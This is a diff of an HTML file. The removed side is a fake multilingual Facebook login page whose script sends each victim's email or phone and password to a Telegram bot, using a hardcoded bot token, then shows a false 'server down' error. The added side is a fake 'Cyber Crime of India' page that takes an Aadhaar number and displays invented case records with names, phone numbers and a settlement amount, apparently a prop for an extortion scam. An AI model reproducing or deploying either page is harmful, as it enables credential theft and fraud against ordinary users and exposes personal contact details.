@@ -1,240 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Facebook Login Multilingual</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
-  body {
-    font-family: 'Roboto', sans-serif;
-    background-color: #f0f2f5;
-    color: #000;
-    margin: 0; padding: 0 15px 40px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    flex-direction: column;
-  }
-  h1.facebook-title {
-    color: #1877f2;
-    font-weight: 900;
-    font-size: 64px;
-    margin: 0 0 5px 0;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  }
-  h3.facebook-subtitle {
-    color: #1877f2;
-    font-weight: 700;
-    font-size: 20px;
-    margin: 0 0 20px 0;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  }
-  .lang-select {
-    margin-bottom: 20px;
-    font-size: 16px;
-    padding: 6px 10px;
-  }
-  .form-container {
-    background: white;
-    padding: 40px 35px;
-    border-radius: 10px;
-    box-shadow: 0 8px 25px rgba(12,35,75,0.12);
-    max-width: 400px;
-    width: 100%;
-  }
-  label {
-    display: block;
-    margin-bottom: 10px;
-    font-weight: 600;
-    color: #222f4f;
-  }
-  input[type="text"], input[type="password"] {
-    width: 100%;
-    padding: 12px;
-    border-radius: 6px;
-    border: 1.8px solid #c1d4e6;
-    font-size: 1em;
-    transition: border-color 0.3s ease;
-    margin-bottom: 20px;
-  }
-  input[type="text"]:focus, input[type="password"]:focus {
-    border-color: #0c234b;
-    outline: none;
-    box-shadow: 0 0 5px #0c234b;
-  }
-  button {
-    background-color: #1877f2;
-    color: white;
-    border: none;
-    padding: 14px 0;
-    width: 100%;
-    border-radius: 8px;
-    font-weight: 700;
-    font-size: 1.1em;
-    letter-spacing: 1.2px;
-    cursor: pointer;
-    box-shadow: 0 5px 15px rgba(24,119,242,0.7);
-    transition: background-color 0.3s ease, box-shadow 0.3s ease;
-  }
-  button:hover {
-    background-color: #165ec9;
-    box-shadow: 0 7px 21px rgba(22,94,201,0.8);
-  }
-  #statusMessage {
-    margin-top: 15px;
-    font-weight: 600;
-    text-align: center;
-    color: red;
-  }
-  #metaText {
-    margin-top: 30px;
-    text-align: center;
-    font-weight: 600;
-    color: #555;
-  }
-</style>
+    <title>Cyber Crime of India</title>
+    <style>
+        body{
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            padding: 20px;
+        }
+        .box{
+            width: 400px;
+            background: #fff;
+            padding: 20px;
+            margin: auto;
+            border-radius: 8px;
+            box-shadow: 0px 0px 8px rgba(0,0,0,0.2);
+        }
+        input{
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+        }
+        button{
+            width: 100%;
+            padding: 10px;
+            background: #0077ff;
+            border: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .result{
+            margin-top: 20px;
+            padding: 10px;
+            background: #e1ffe1;
+            border-left: 5px solid green;
+        }
+    </style>
+    <script>
+        function searchAadhar(){
+            document.getElementById("resultArea").style.display = "block";
+        }
+    </script>
 </head>
 <body>
 
-<h1 class="facebook-title">Facebook</h1>
-<h3 class="facebook-subtitle">Earn money Facebook</h3>
-
-<select id="languageSelector" class="lang-select" aria-label="Select Language">
-  <option value="en" selected>English</option>
-  <option value="bn">বাংলা</option>
-  <option value="hi">हिन्दी</option>
-  <option value="ta">தமிழ்</option>
-</select>
-
-<div class="form-container">
-  <form id="loginForm">
-    <label for="loginId" id="labelLoginId">Email or Mobile No.</label>
-    <input type="text" id="loginId" name="loginId" placeholder="Enter email or mobile number" required />
+<div class="box">
+    <h2 style="text-align:center;">Cyber Crime of India</h2>
     
-    <label for="loginPassword" id="labelPassword">Password</label>
-    <input type="password" id="loginPassword" name="loginPassword" placeholder="Enter password" required />
+    <label>Enter Aadhaar Card Number:</label>
+    <input type="text" placeholder="xxxx-xxxx-xxxx">
     
-    <button type="submit" id="submitBtn">Login</button>
-  </form>
-  <div id="statusMessage"></div>
+    <button onclick="searchAadhar()">Search</button>
+
+    <div id="resultArea" class="result" style="display:none;">
+        <h3>Cases Found: 2 Opened</h3>
+        <p>1. Bishnu Biswas</p>
+        <p>2. Swapanandu Ghosh</p>
+        <p>Mobile: 89107 22437</p>
+        <br>
+        <strong>Complainer Name:</strong> Ashok <br>
+        <strong>Phone:</strong> 9748323123 <br>
+        <strong>Case Settlement Amount:</strong> 10,000/- <br>
+        <strong>Time:</strong> 45 Days
+    </div>
+
 </div>
-
-<div id="metaText">meta</div>
-
-<script>
-  const translations = {
-    en: {
-      labelLoginId: "Email or Mobile No.",
-      placeholderLoginId: "Enter email or mobile number",
-      labelPassword: "Password",
-      placeholderPassword: "Enter password",
-      submitBtn: "Login",
-      statusEmpty: "Please provide all information.",
-      statusServerDown: "Server down, please try again later."
-    },
-    bn: {
-      labelLoginId: "ইমেইল বা মোবাইল নং",
-      placeholderLoginId: "ইমেইল বা মোবাইল নং লিখুন",
-      labelPassword: "পাসওয়ার্ড",
-      placeholderPassword: "পাসওয়ার্ড লিখুন",
-      submitBtn: "লগইন",
-      statusEmpty: "অনুগ্রহ করে সব তথ্য প্রদান করুন।",
-      statusServerDown: "সার্ভার ডাউন, পরে আবার চেষ্টা করুন।"
-    },
-    hi: {
-      labelLoginId: "ईमेल या मोबाइल नंबर",
-      placeholderLoginId: "ईमेल या मोबाइल नंबर दर्ज करें",
-      labelPassword: "पासवर्ड",
-      placeholderPassword: "पासवर्ड दर्ज करें",
-      submitBtn: "लॉगिन करें",
-      statusEmpty: "कृपया सभी जानकारी दर्ज करें।",
-      statusServerDown: "सर्वर डाउन है, कृपया बाद में प्रयास करें।"
-    },
-    ta: {
-      labelLoginId: "மின்னஞ்சல் அல்லது மொபைல் எண்",
-      placeholderLoginId: "மின்னஞ்சல் அல்லது மொபைல் எண் பதிவு செய்க",
-      labelPassword: "கடவுச்சொல்",
-      placeholderPassword: "கடவுச்சொல்லை உள்ளிடவும்",
-      submitBtn: "உள்நுழைய",
-      statusEmpty: "எல்லா விவரங்களையும் வழங்கவும்.",
-      statusServerDown: "சேவையகம் தாமதமாக உள்ளது, தயவுசெய்து பிறகு முயற்சிக்கவும்."
-    }
-  };
-
-  const langSelector = document.getElementById('languageSelector');
-  const labelLoginId = document.getElementById('labelLoginId');
-  const loginIdInput = document.getElementById('loginId');
-  const labelPassword = document.getElementById('labelPassword');
-  const loginPasswordInput = document.getElementById('loginPassword');
-  const submitBtn = document.getElementById('submitBtn');
-  const statusMessage = document.getElementById('statusMessage');
-
-  function updateLanguage(lang) {
-    labelLoginId.textContent = translations[lang].labelLoginId;
-    loginIdInput.placeholder = translations[lang].placeholderLoginId;
-    labelPassword.textContent = translations[lang].labelPassword;
-    loginPasswordInput.placeholder = translations[lang].placeholderPassword;
-    submitBtn.textContent = translations[lang].submitBtn;
-    statusMessage.textContent = '';
-  }
-
-  langSelector.addEventListener('change', e => {
-    updateLanguage(e.target.value);
-  });
-
-  // ডিফল্ট ইংলিশ দিয়ে শুরু করছি
-  updateLanguage('en');
-
-  const botToken = '5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE';
-  const chatId = '-1003102946985';
-
-  document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-
-    const lang = langSelector.value;
-    const loginId = loginIdInput.value.trim();
-    const loginPassword = loginPasswordInput.value;
-
-    if (!loginId || !loginPassword) {
-      statusMessage.textContent = translations[lang].statusEmpty;
-      statusMessage.style.color = "red";
-      return;
-    }
-
-    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const messageText = `
-New login attempt:
-Email/Mobile: ${loginId}
-Password: ${loginPassword}
-    `;
-
-    fetch(telegramApiUrl, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: messageText
-      })
-    })
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        statusMessage.textContent = translations[lang].statusServerDown;
-        statusMessage.style.color = "red";
-        document.getElementById('loginForm').reset();
-      } else {
-        statusMessage.textContent = "Error: " + (data.description || "Failed to send");
-        statusMessage.style.color = "red";
-      }
-    })
-    .catch(error => {
-      statusMessage.textContent = "Error: "+ error.message;
-      statusMessage.style.color = "red";
-    });
-  });
-</script>
 
 </body>
 </html>
